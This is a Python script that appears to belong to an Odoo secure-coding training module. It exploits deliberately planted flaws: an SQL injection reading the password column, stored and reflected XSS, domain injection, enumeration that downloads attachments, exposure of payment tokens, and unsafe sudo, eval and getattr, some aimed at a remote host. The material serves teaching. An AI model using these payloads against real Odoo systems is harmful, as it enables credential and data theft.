#!/usr/bin/env python3
import base64
import os
import re
import requests
import sys

local_db, local_url = "safer_db", "http://localhost:8069"
remote_db, remote_url = "safer_db", "http://s.ldx.be:8069"


def user(username):
    def decorator(func):
        def wrapper(self, *args, **kwargs):
            session_origin = self.session
            session = requests.session()
            session.post(
                f"{self.url}/web/session/authenticate",
                json={"params": {"db": self.db, "login": username, "password": username}},
            )
            self.session = session
            try:
                result = func(self, *args, **kwargs)
            finally:
                session.close()
                self.session = session_origin
            return result

        return wrapper

    return decorator


class Exploiter:
    def __init__(self, db, url):
        self.db = db
        self.url = url
        self.session = requests.session()

    def rpc(self, model, method, *args, **kwargs):
        """Helper to make JSONRPC calls to an Odoo server and call model methods

        Examples:

        # @api.model method, no `ids` to pass to the model method
        partner_id = rpc("res.partner", "create", {"name": "foo"}, context={"default_email": "foo@foo.com"})
        # regular model method, need to pass ids to the model method
        rpc("res.partner", "write", [partner_id], {"company_name": "bar"})
        # method specific to that model, but not @api.model, so need to pass ids
        rpc("res.partner", "create_company", [partner_id])

        [partner] = rpc("res.partner", "read", [partner_id], ["name", "email", "parent_id"])
        print(partner)

        [partner_company] = rpc(
            "res.partner", "search_read", [("name", "=", "bar")], ["name", "child_ids"], order="id DESC", limit=1
        )
        print(partner_company)
        """
        response = self.session.post(
            f"{self.url}/web/dataset/call_kw",
            json={
                "params": {
                    "model": model,
                    "method": method,
                    "args": args,
                    "kwargs": kwargs,
                }
            },
        )
        try:
            response = response.json()
        except Exception:  # noqa: BLE001
            print(response.text)  # noqa: T201
            raise Exception
        if "error" in response:
            raise Exception(response["error"]["data"]["debug"])
        return response["result"]

    def ref(self, xml_id):
        module, name = xml_id.split(".")
        [result] = self.rpc("ir.model.data", "search_read", [("module", "=", module), ("name", "=", name)], ["res_id"])
        return result["res_id"]

    @user("admin")
    def get_action_url(self, menu_xml_id, record_xml_id):
        menu_id = self.ref(menu_xml_id)
        [result] = self.rpc("ir.ui.menu", "read", [menu_id], ["action"])
        action_id = result["action"].split(",")[1]
        record_id = self.ref(record_xml_id)
        return f"{self.url}/web#action={action_id}&menu_id={menu_id}&view_type=form&id={record_id}"

    @user("portal")
    def leak_sql_1(self):
        """
        leak: safer_code/leaks/leak_1_sql_injection.py
        test: safer_code/tests/test_leak_1_sql_injection.py
        odoo-bin -d safer_db --test-tags .test_unsafe_cr_execute
        """
        composer_id = self.rpc(
            "safer_code.compose.message",
            "create",
            {
                "subject": "foo",
                "body": "foo",
                "model": "res.partner",
                "res_id": 1,
            },
        )
        result = self.rpc(
            "safer_code.compose.message",
            "get_blacklist_records_ids",
            [composer_id],
            ["1);SELECT password FROM res_users--"],
        )
        print(result)  # noqa: T201

    @user("portal")
    def leak_sql_2(self):
        """
        leak: safer_code/leaks/leak_1_sql_injection.py
        test: safer_code/tests/test_leak_1_sql_injection.py
        odoo-bin -d safer_db --test-tags .test_unsafe_query_order
        """
        result = self.rpc(
            "safer_code.account.move.line",
            "search_read",
            [],
            ["name"],
            context={
                "matching_amount_aml_ids": [
                    # Pass something here to inject SQL
                    # Step 1. Try to inject a SELECT.
                    # The code will raise an exception, but you can get sensitive information in the traceback
                    # Step 2. Try to inject an INSERT or UPDATE
                    # e.g in the table `INSERT INTO safer_code(value) VALUES('my name')`
                ]
            },
        )
        print(result)  # noqa: T201

    @user("portal")
    def leak_sudo_1(self):
        """
        leak: safer_code/leaks/leak_2_unsafe_sudo.py
        test: safer_code/tests/test_leak_2_unsafe_sudo.py
        odoo-bin -d safer_db --test-tags .test_unsafe_sudo_route_me
        """
        response = self.session.get(f"{self.url}/me")
        csrf_token = re.search(r'<input.*name="csrf_token".*value="(.*)"/>', response.content.decode()).groups()[0]
        self.session.post(
            f"{self.url}/me",
            data={"comment": '<a href="https://www.hacker.com">My Website</a>', "csrf_token": csrf_token},
        )
        url = self.get_action_url("contacts.res_partner_menu_contacts", "base.partner_demo_portal")
        print(  # noqa: T201
            f"""
            - Open {url},
            - connect as admin,
            - Open the tab "Internal notes" and see the link which has been set.
        """
        )

    @user("portal")
    def leak_sudo_2(self):
        """
        leak: safer_code/leaks/leak_2_unsafe_sudo.py
        test: safer_code/tests/test_leak_2_unsafe_sudo.py
        odoo-bin -d safer_db --test-tags .test_unsafe_sudo_domain_injection
        """
        response = self.session.post(
            f"{self.url}/my-last-messages",
            json={
                "params": {
                    # Pass something in the below domain
                    # e.g. a domain body contains 'password'
                    "domain": [],
                }
            },
        )
        print(response.json())  # noqa: T201

    @user("portal")
    def leak_sudo_3(self):
        """
        leak: safer_code/leaks/leak_2_unsafe_sudo.py
        test: safer_code/tests/test_leak_2_unsafe_sudo.py
        odoo-bin -d safer_db --test-tags .test_unsafe_sudo_writable_whitelist

        This one requires a bit more conditions: Your portal user must get invited as a collaborator of a project
        and a task must exist in that project.
        Meaning, only external collaborators of a project can exploit this leak.
        However, on Odoo.com, we do have some projects
        in which we invited collaborators external to the company (partners).
        These additional conditions are added as demo data in `safer_code/data/leak_2_unsafe_sudo_demo.xml`.
        So, everything is prepared so you can directly call the below to exploit something.

        The fields on which collaborators can write is white-listed, in the global list PROJECT_TASK_WRITABLE_FIELDS
        For easyness, the list in this module is reduced it to 4 fields, compared to the actual real whitelist,
        and the available writable fields are pre-filled below.

        Then, the definitions of each fields is available in the model class:
        safer_code/models/task.py
        """
        self.rpc(
            "safer_code.task",
            "write",
            [1],
            {
                'name': None,
                'description': None,
                'partner_id': None,
                'partner_email': None,
            },
        )

    @user("demo")
    def leak_sudo_4(self):
        """
        leak: safer_code/leaks/leak_2_unsafe_sudo.py
        test: safer_code/tests/test_leak_2_unsafe_sudo.py
        odoo-bin -d safer_db --test-tags .test_unsafe_related_sudo
        """
        template_id = self.rpc(
            "safer_code.sign.template",
            "create",
            {
                "attachment_id": 1,
            },
        )
        download_folder = os.path.join(os.path.expanduser("~/Downloads"), "safer_code_results")
        os.makedirs(download_folder, exist_ok=True)
        for attachment_id in range(1, 500):
            try:
                self.rpc("safer_code.sign.template", "write", [template_id], {"attachment_id": attachment_id})
            except Exception:  # noqa: BLE001
                continue
            [result] = self.rpc("safer_code.sign.template", "read", [template_id], ["name", "datas"])
            if not result["datas"]:
                continue
            with open(os.path.join(download_folder, result["name"]), "wb") as f:
                f.write(base64.b64decode(result["datas"]))

    @user("portal")
    def leak_rule_1(self):
        """
        leak: safer_code/leaks/leak_3_master_the_rules.py
        test: safer_code/tests/test_leak_3_master_the_rules.py
        odoo-bin -d safer_db --test-tags .test_unsafe_access_rights_channel_partner
        """
        result = self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"])
        print(result)  # noqa: T201
        for partner_id in range(30):
            self.rpc("safer_code.mail.channel.partner", "create", {"partner_id": partner_id, "channel_id": 1})
        result = self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"])
        print(result)  # noqa: T201

    @user("portal")
    def leak_password_1(self):
        """
        leak: safer_code/leaks/leak_4_guard_password_and_tokens_fiercely.py
        test: safer_code/tests/test_leak_4_guard_password_and_tokens_fiercely.py
        odoo-bin -d safer_db --test-tags .test_unsafe_token
        """
        result = self.rpc("safer_code.payment.acquirer", "search_read", [], [])
        print(result)  # noqa: T201

    def leak_xss_1(self):
        """
        leak: safer_code/leaks/leak_6_xss.py
        test: safer_code/tests/test_leak_6_xss.py
        odoo-bin -d safer_db --test-tags .test_unsafe_reflected_xss_forum
        """
        print(  # noqa: T201
            """
            - Open http://localhost:8069/safer_code/profile/user/1?forum_origin=javascript%3A,
            - connect as admin,
            - add JS code after `javascript:`,
            - then, click on the link "< Back".
        """
        )

    @user("demo")
    def leak_xss_2(self):
        """
        leak: safer_code/leaks/leak_6_xss.py
        test: safer_code/tests/test_leak_6_xss.py
        odoo-bin -d safer_db --test-tags .test_unsafe_stored_xss
        """
        self.rpc("res.partner", "write", [27], {"name": """<img src=x onerror="Write javascript here"/>"""})
        print(  # noqa: T201
            """
            - Open http://localhost:8069/odoo/contacts/27,
            - connect as admin,
            - click `Give a call` next to the phone number.
        """
        )

    @user("admin")
    def leak_open_1(self):
        """
        leak: safer_code/leaks/leak_7_open_with_care.py
        test: safer_code/tests/test_leak_7_open_with_care.py
        odoo-bin -d safer_db --test-tags .test_open_with_care

        Vulnerable part of the code:
        safer_code/leaks/leak_7_open_with_care.py:52
        Dict keys to pass to `get_asset_bundle`:
        safer_code/leaks/leak_7_open_with_care.py:24
        """
        url = self.get_action_url("base.menu_server_action", "safer_code.server_action_open_with_care")
        print(  # noqa: T201
            f"""
            - Open {url},
            - connect as admin,
            - edit the code to exploit `env['safer_code.ir.qweb'].get_asset_bundle`.
        """
        )

    @user("admin")
    def leak_eval_1(self):
        """
        leak: safer_code/leaks/leak_8_eval_is_evil.py
        test: safer_code/tests/test_leak_8_eval_is_evil.py
        odoo-bin -d safer_db --test-tags .test_eval_is_evil
        """
        url = self.get_action_url("base.menu_server_action", "safer_code.server_action_eval_is_evil")
        print(  # noqa: T201
            f"""
            - Open {url},
            - connect as admin,
            - edit the code to exploit `env['safer_code.account.move']._get_invoice_action`.
        """
        )

    @user("admin")
    def leak_objects_1(self):
        """
        leak: safer_code/leaks/leak_9_dangerous_objects.py
        test: safer_code/tests/test_leak_9_dangerous_objects.py
        odoo-bin -d safer_db --test-tags .test_unsafe_x509_certificate
        """
        url = self.get_action_url("base.menu_server_action", "safer_code.server_action_dangerous_objects")
        print(  # noqa: T201
            f"""
            - Open {url},
            - connect as admin,
            - edit the code to exploit `BIO_new_file`.
        """
        )

    @user("admin")
    def leak_getattr_1(self):
        """
        leak: safer_code/leaks/leak_10_unsafe_getattr_setattr.py
        test: safer_code/tests/test_leak_10_unsafe_getattr_setattr.py
        odoo-bin -d safer_db --test-tags .test_unsafe_setattr
        """
        url = self.get_action_url("base.menu_server_action", "safer_code.server_action_unsafe_setattr")
        print(  # noqa: T201
            f"""
            - Open {url},
            - connect as admin,
            - edit the code to exploit `env['ir.attachment']._field_add`.
        """
        )

    @user("admin")
    def leak_getattr_2(self):
        """
        leak: safer_code/leaks/leak_10_unsafe_getattr_setattr.py
        test: safer_code/tests/test_leak_10_unsafe_getattr_setattr.py
        odoo-bin -d safer_db --test-tags .test_unsafe_getattr
        """
        url = self.get_action_url("base.menu_server_action", "safer_code.server_action_unsafe_getattr")
        print(  # noqa: T201
            f"""
            - Open {url},
            - connect as admin,
            - edit the code to exploit `self._get_field`.
        """
        )


args = sys.argv[1:]
db, url = local_db, local_url
if args[0] == "remote":
    args = args[1:]
    db, url = remote_db, remote_url

exploiter = Exploiter(db, url)
for name in args:
    getattr(exploiter, f"leak_{name}")()
